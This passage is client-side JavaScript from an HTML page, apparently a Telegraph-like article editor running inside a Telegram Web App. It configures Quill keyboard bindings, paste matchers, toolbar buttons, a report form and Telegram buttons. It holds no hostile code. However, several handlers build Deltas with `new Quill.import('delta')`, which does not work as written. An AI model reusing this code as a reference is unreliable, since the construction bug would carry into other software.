                        return node;
                    }
                    
                    optimize() {
                        super.optimize();
                        const direction = window.getComputedStyle(this.domNode).direction;
                        if (direction === 'rtl') {
                            this.domNode.classList.add('dir_rtl');
                        } else {
                            this.domNode.classList.remove('dir_rtl');
                        }
                    }
                }
                ListAuto.blotName = 'list';
                Quill.register(ListAuto);
                
                console.log('All custom Blot classes registered');
            }
        }
        
        /**
         * Инициализация редактора Quill с полной конфигурацией
         */
        function initQuill() {
            // Регистрируем кастомные Blot классы
            TelegraphBlotRegistry.registerAll();
            
            // Получаем черновик
            const draftManager = new TelegraphDraftManager();
            const draft = draftManager.get();
            
            if (draft) {
                $('#_tl_editor .ql-editor').html(draft);
            }
            
            // Конфигурация модулей Quill
            const modules = {
                toolbar: false,
                keyboard: {
                    bindings: {
                        // Обработка Enter для специальных блоков
                        'required enter': {
                            key: 'enter',
                            collapsed: true,
                            format: ['blockTitle', 'blockAuthor'],
                            handler: function(range, context) {
                                const quill = this.quill;
                                const line = quill.getLine(range.index);
                                
                                if (line && line[0] && line[0].next && !$(line[0].next.domNode).text()) {
                                    quill.setSelection(line[0].next.offset(quill.scroll), 0);
                                    return false;
                                }
                                
                                quill.insertText(range.index, '\n');
                                return false;
                            }
                        },
                        
                        // Обработка Tab для навигации между полями
                        'required tab next': {
                            key: 'tab',
                            shiftKey: false,
                            handler: function(range, context) {
                                const quill = this.quill;
                                const blot = quill.scroll.descendant(
                                    Quill.import('blots/block'),
                                    range.index
                                )[0];
                                
                                if (blot && blot.next && blot.next instanceof Quill.import('blots/author')) {
                                    const offset = blot.next.offset(quill.scroll);
                                    const length = blot.next.length();
                                    quill.setSelection(offset, length > 1 ? length : 0);
                                    return false;
                                }
                                
                                return true;
                            }
                        },
                        
                        'required tab prev': {
                            key: 'tab',
                            shiftKey: true,
                            handler: function(range, context) {
                                const quill = this.quill;
                                const blot = quill.scroll.descendant(
                                    Quill.import('blots/block'),
                                    range.index
                                )[0];
                                
                                if (blot && blot.prev && blot.prev instanceof Quill.import('blots/title')) {
                                    const offset = blot.prev.offset(quill.scroll);
                                    const length = blot.prev.length();
                                    quill.setSelection(offset, length > 1 ? length : 0);
                                    return false;
                                }
                                
                                return true;
                            }
                        },
                        
                        // Создание разделителя
                        'divider autofill': {
                            key: 'enter',
                            collapsed: true,
                            prefix: /^(-|\*){3,}$/,
                            handler: function(range, context) {
                                const quill = this.quill;
                                const line = quill.getLine(range.index);
                                
                                if (line && line[0]) {
                                    const offset = line[0].offset(quill.scroll);
                                    const delta = new Quill.import('delta')
                                        .retain(offset)
                                        .delete(line[0].length())
                                        .insert({ blockDivider: true });
                                    
                                    if (!line[0].next) {
                                        delta.insert('\n');
                                    }
                                    
                                    quill.updateContents(delta);
                                    return false;
                                }
                                
                                return true;
                            }
                        },
                        
                        // Автодетект ссылок при вводе пробела
                        'detect link': {
                            key: ' ',
                            collapsed: true,
                            handler: function(range, context) {
                                const quill = this.quill;
                                const line = quill.getLine(range.index);
                                
                                if (line && line[0]) {
                                    const text = line[0].domNode.innerText;
                                    const offset = line[0].offset(quill.scroll);
                                    const position = range.index - offset;
                                    
                                    // Ищем URL в тексте
                                    const urlMatch = text.substring(0, position).match(/(https?:\/\/[^\s]+)$/);
                                    if (urlMatch) {
                                        const url = urlMatch[1];
                                        const start = offset + position - url.length;
                                        
                                        // Проверяем, не является ли это уже ссылкой
                                        const linkBlots = quill.scroll.descendants(
                                            Quill.import('blots/link'),
                                            start,
                                            url.length
                                        );
                                        
                                        if (linkBlots.length === 0) {
                                            quill.formatText(start, url.length, 'link', url);
                                        }
                                    }
                                }
                                
                                return true;
                            }
                        },
                        
                        // Создание списка
                        'list autofill': {
                            key: ' ',
                            collapsed: true,
                            prefix: /^(1\.|-|\*)$/,
                            handler: function(range, context) {
                                const quill = this.quill;
                                const prefix = context.prefix;
                                const offset = range.index - prefix.length;
                                
                                quill.deleteText(offset, prefix.length);
                                
                                const listType = prefix === '1.' ? 'ordered' : 'bullet';
                                quill.formatLine(offset, 1, 'list', listType);
                                quill.setSelection(offset, 0);
                                
                                return false;
                            }
                        },
                        
                        // Блок кода с обратными кавычками
                        'pre wrap': {
                            key: '`',
                            collapsed: true,
                            prefix: /^``$/,
                            handler: function(range, context) {
                                const quill = this.quill;
                                const offset = range.index - 2;
                                
                                quill.deleteText(offset, 2);
                                quill.formatLine(offset, 1, 'code-block', true);
                                quill.setSelection(offset, 0);
                                
                                return false;
                            }
                        }
                    }
                },
                clipboard: {
                    matchers: [
                        // Конвертация h2 в заголовок
                        ['h2', function(node, delta) {
                            return delta.compose(new Quill.import('delta').retain(delta.length(), { blockHeader: true }));
                        }],
                        
                        // Конвертация h5, h6 в подзаголовок
                        ['h5, h6', function(node, delta) {
                            return delta.compose(new Quill.import('delta').retain(delta.length(), { blockSubheader: true }));
                        }],
                        
                        // Конвертация изображений
                        ['img', function(node, delta) {
                            const src = node.getAttribute('src');
                            const alt = node.getAttribute('alt') || '';
                            
                            if (src && TelegraphUtils.sanitizeUrl(src, ['http:', 'https:', 'data:'])) {
                                return new Quill.import('delta').insert({
                                    blockFigure: { image: src, caption: alt }
                                });
                            }
                            
                            return delta;
                        }],
                        
                        // Конвертация видео
                        ['video', function(node, delta) {
                            const src = node.getAttribute('src');
                            
                            if (src && TelegraphUtils.sanitizeUrl(src, ['http:', 'https:', 'data:'])) {
                                return new Quill.import('delta').insert({
                                    blockFigure: { video: src }
                                });
                            }
                            
                            return delta;
                        }],
                        
                        // Конвертация iframe
                        ['iframe', function(node, delta) {
                            const src = node.getAttribute('src');
                            
                            if (src && TelegraphUtils.sanitizeUrl(src, ['http:', 'https:'])) {
                                return new Quill.import('delta').insert({
                                    blockFigure: { embed: src }
                                });
                            }
                            
                            return delta;
                        }],
                        
                        // Конвертация inline переносов
                        ['br.inline', function(node, delta) {
                            return new Quill.import('delta').insert({ textBreak: true });
                        }]
                    ]
                }
            };
            
            // Создаем экземпляр Quill
            const quill = new Quill('#_tl_editor', {
                theme: null,
                readOnly: true,
                modules: modules,
                formats: [
                    'bold', 'italic', 'underline', 'strike', 'code',
                    'link', 'textBreak',
                    'blockTitle', 'blockAuthor', 'blockHeader', 'blockSubheader',
                    'blockBlockquote', 'blockPullquote', 'blockDivider', 'blockFigure',
                    'code-block', 'list', 'bullet', 'ordered'
                ]
            });
            
            // Сохраняем в глобальную область видимости
            window.quill = quill;
            
            // Добавляем контейнеры для тултипов
            quill.addContainer(document.getElementById('_tl_link_tooltip'));
            quill.addContainer(document.getElementById('_tl_tooltip'));
            quill.addContainer(document.getElementById('_tl_blocks'));
            
            // Обработчики событий Quill
            quill.on('selection-change', function(range, oldRange, source) {
                if (range) {
                    TelegraphToolbarManager.update(range);
                    
                    if (quill.isEnabled() && range.length === 0) {
                        TelegraphTooltipManager.showFormatTooltip(range);
                    } else {
                        TelegraphTooltipManager.hideFormatTooltip();
                    }
                    
                    // Показываем/скрываем блоки
                    const line = quill.getLine(range.index);
                    if (line && line[0] && $(line[0].domNode).text().length === 0 && range.length === 0) {
                        TelegraphTooltipManager.showBlocksTooltip(range);
                    } else {
                        TelegraphTooltipManager.hideBlocksTooltip();
                    }
                } else {
                    TelegraphTooltipManager.hideFormatTooltip();
                    TelegraphTooltipManager.hideBlocksTooltip();
                }
            });
            
            quill.on('text-change', function(delta, oldDelta, source) {
                if (source === 'user') {
                    // Автосохранение черновика
                    TelegraphSaveManager.autoSave();
                    
                    // Трекинг аналитики
                    TelegraphAnalyticsManager.trackEditorAction('text_change', {
                        delta: delta,
                        source: source
                    });
                }
            });
            
            quill.on('scroll-optimize', function(mutations) {
                mutations.forEach(function(mutation) {
                    if (mutation.type === 'childList' && mutation.removedNodes.length) {
                        // Оптимизация DOM после изменений
                        const prev = mutation.previousSibling;
                        const next = mutation.nextSibling;
                        
                        if (!next && prev && prev.tagName === 'BR' && prev.className === 'inline') {
                            const br = document.createElement('br');
                            br.className = 'inline';
                            mutation.target.appendChild(br);
                        }
                    }
                });
            });
            
            // Инициализация истории изменений
            const historyManager = new TelegraphHistoryManager();
            quill.on('text-change', function(delta, oldDelta, source) {
                if (source === 'user') {
                    historyManager.trackChange(delta, oldDelta, source);
                }
            });
            
            // Глобальные горячие клавиши
            $(document).on('keydown', function(e) {
                // Ctrl+Z / Cmd+Z - отмена
                if ((e.ctrlKey || e.metaKey) && e.key === 'z' && !e.shiftKey) {
                    if (historyManager.canUndo()) {
                        historyManager.undo();
                        e.preventDefault();
                    }
                }
                
                // Ctrl+Shift+Z / Cmd+Shift+Z - повтор
                if ((e.ctrlKey || e.metaKey) && e.key === 'z' && e.shiftKey) {
                    if (historyManager.canRedo()) {
                        historyManager.redo();
                        e.preventDefault();
                    }
                }
                
                // Ctrl+S / Cmd+S - сохранение
                if ((e.ctrlKey || e.metaKey) && e.key === 's') {
                    TelegraphSaveManager.savePage();
                    e.preventDefault();
                }
                
                // Ctrl+E / Cmd+E - переключение режима редактирования
                if ((e.ctrlKey || e.metaKey) && e.key === 'e') {
                    TelegraphEditorManager.toggleEditMode();
                    e.preventDefault();
                }
            });
            
            // Обновляем редактируемый текст
            TelegraphEditorManager.updateEditableText();
            
            return quill;
        }
        
        $(document).ready(function() {
            // Инициализация редактора Quill
            const quill = initQuill();
            
            // Инициализация менеджеров
            const draftManager = new TelegraphDraftManager();
            const sessionManager = new TelegraphSessionManager();
            const historyManager = new TelegraphHistoryManager();
            const cacheManager = TelegraphCacheManager.getInstance();
            
            // Создаем глобальный объект приложения
            window.TelegraphApp = {
                // Менеджеры
                utils: TelegraphUtils,
                storage: TelegraphStorage,
                draft: draftManager,
                content: TelegraphContentManager,
                editor: TelegraphEditorManager,
                tooltips: TelegraphTooltipManager,
                media: TelegraphMediaManager,
                popups: TelegraphPopupManager,
                auth: TelegraphAuthManager,
                report: TelegraphReportManager,
                toolbar: TelegraphToolbarManager,
                save: TelegraphSaveManager,
                history: historyManager,
                session: sessionManager,
                analytics: TelegraphAnalyticsManager,
                settings: TelegraphSettingsManager,
                cache: cacheManager,
                
                // Функции
                savePage: TelegraphSaveManager.savePage,
                toggleEdit: TelegraphEditorManager.toggleEditMode,
                showReport: TelegraphReportManager.showReportDialog,
                checkAuth: TelegraphAuthManager.checkAuth,
                login: TelegraphAuthManager.login,
                logout: TelegraphAuthManager.logout,
                exportContent: TelegraphSaveManager.exportContent,
                printPage: TelegraphSaveManager.printPage,
                
                // Состояние
                quill: quill,
                config: T,
                telegramWebApp: window.Telegram?.WebApp || null,
                isTelegramWebView: true
            };
            
            // Инициализация элементов интерфейса
            const $tl_tooltip = $('#_tl_tooltip');
            const $tl_blocks = $('#_tl_blocks');
            const $bold_button = $('#_bold_button');
            const $italic_button = $('#_italic_button');
            const $link_button = $('#_link_button');
            const $header_button = $('#_header_button');
            const $subheader_button = $('#_subheader_button');
            const $quote_button = $('#_quote_button');
            const $image_button = $('#_image_button');
            const $embed_button = $('#_embed_button');
            const $edit_button = $('#_edit_button');
            const $publish_button = $('#_publish_button');
            const $report_button = $('#_report_button');
            const $report_popup = $('#_report_popup');
            const $report_form = $('#_report_form');
            const $report_cancel = $('#_report_cancel');
            
            // Инициализация hover-эффектов для тултипа
            TelegraphToolbarManager.initializeButtonHover();
            
            // Обработчики кнопок форматирования
            $bold_button.click(function(e) {
                e.preventDefault();
                TelegraphToolbarManager.handleFormatButton('_bold_button', 'bold');
            });
            
            $italic_button.click(function(e) {
                e.preventDefault();
                TelegraphToolbarManager.handleFormatButton('_italic_button', 'italic');
            });
            
            $link_button.click(function(e) {
                e.preventDefault();
                TelegraphToolbarManager.handleFormatButton('_link_button', 'link');
            });
            
            $header_button.click(function(e) {
                e.preventDefault();
                TelegraphToolbarManager.handleFormatButton('_header_button', 'blockHeader');
            });
            
            $subheader_button.click(function(e) {
                e.preventDefault();
                TelegraphToolbarManager.handleFormatButton('_subheader_button', 'blockSubheader');
            });
            
            $quote_button.click(function(e) {
                e.preventDefault();
                TelegraphToolbarManager.handleFormatButton('_quote_button', 'blockBlockquote');
            });
            
            // Обработчики медиа кнопок
            $image_button.click(function(e) {
                e.preventDefault();
                TelegraphToolbarManager.handleMediaButton('_image_button');
            });
            
            $embed_button.click(function(e) {
                e.preventDefault();
                TelegraphToolbarManager.handleMediaButton('_embed_button');
            });
            
            // Обработчики основных кнопок
            $publish_button.click(function(e) {
                e.preventDefault();
                TelegraphSaveManager.savePage();
                TelegraphAnalyticsManager.trackEvent('button', 'click', 'publish');
            });
            
            $edit_button.click(function(e) {
                e.preventDefault();
                const newMode = TelegraphEditorManager.toggleEditMode();
                TelegraphAnalyticsManager.trackEvent('button', 'click', newMode ? 'edit' : 'view');
            });
            
            // Обработчики формы репорта
            $report_button.click(function(e) {
                e.preventDefault();
                TelegraphReportManager.showReportDialog();
                TelegraphAnalyticsManager.trackEvent('button', 'click', 'report');
            });
            
            $report_form.submit(function(e) {
                e.preventDefault();
                TelegraphReportManager.sendReport();
            });
            
            $report_form.find('input[type="radio"]').change(function() {
                TelegraphReportManager.updateReportFormState();
            });
            
            $report_cancel.click(function(e) {
                e.preventDefault();
                TelegraphReportManager.cancelReport();
            });
            
            // Обработчики оконных событий
            $(window).on('scroll resize', TelegraphUtils.throttle(function() {
                TelegraphTooltipManager.updateAllPositions();
            }, 100));
            
            // Загрузка спрайта иконок
            (new Image()).src = window.devicePixelRatio >= 2 ? 
                'https://telegra.ph/images/icons_2x.png?1' : 
                'https://telegra.ph/images/icons.png?1';
            
            // Инициализация Telegram Web App кнопок
            const tg = window.Telegram?.WebApp;
            if (tg) {
                // Обновляем MainButton при изменении режима редактирования
                const updateMainButton = function() {
                    if (tg.MainButton) {
                        const isEditMode = TelegraphEditorManager.isEditMode();
                        
                        if (isEditMode) {
                            tg.MainButton.setText("Опубликовать");
                            tg.MainButton.show();
                        } else {
                            tg.MainButton.hide();
                        }
                    }
                };
                
                // Следим за изменениями режима редактирования
                const observer = new MutationObserver(function(mutations) {
                    mutations.forEach(function(mutation) {
                        if (mutation.attributeName === 'class') {
                            updateMainButton();
                        }
                    });
                });
                
                const $article = $('.tl_article');
                if ($article.length) {
                    observer.observe($article[0], { attributes: true });
                }
                
                // Инициализируем кнопку сразу
                updateMainButton();
                
                // Обработчик основной кнопки
                tg.MainButton.onClick(function() {
                    TelegraphSaveManager.savePage();
                });
                
                // Обработчик кнопки назад
                tg.BackButton.onClick(function() {
                    if (TelegraphEditorManager.isEditMode()) {
                        TelegraphEditorManager.updateEditable(false);
                    } else if (window.history.length > 1) {
                        window.history.back();
                    } else {
                        tg.close();
                    }
                });
            }
            
            // Загрузка аутентификации
            TelegraphAuthManager.checkAuth().then(function() {
                // Применяем настройки
                TelegraphSettingsManager.applySettings();
                
                // Трекинг просмотра страницы
                TelegraphAnalyticsManager.trackPageView();
                
                // Показываем уведомление о черновике
                if (draftManager.hasDraft() && !T.pageId) {
                    setTimeout(() => {
                        const draftInfo = draftManager.getDraftInfo();
                        if (draftInfo) {
                            TelegraphPopupManager.showToast('Draft autosaved', 'info');
                        }
                    }, 1000);
                }
            }).catch(function(error) {
                console.error('Auth check failed:', error);
            });
            
            // Предотвращаем закрытие страницы при наличии несохраненных изменений
            window.addEventListener('beforeunload', function(e) {
                if (TelegraphEditorManager.isEditMode() && draftManager.shouldAutoSave()) {
                    const message = 'You have unsaved changes. Are you sure you want to leave?';
                    e.returnValue = message;
                    return message;
                }
            });
            
            // Инициализация настроек по умолчанию
            TelegraphSettingsManager.applySettings();
            
            console.log('Telegraph application initialized successfully');
        });
    </script>
    
    <script async src="https://t.me/_websync_?path=hello-12-24-212&hash=e20bb365b308b4828b"></script>
</body>
</html>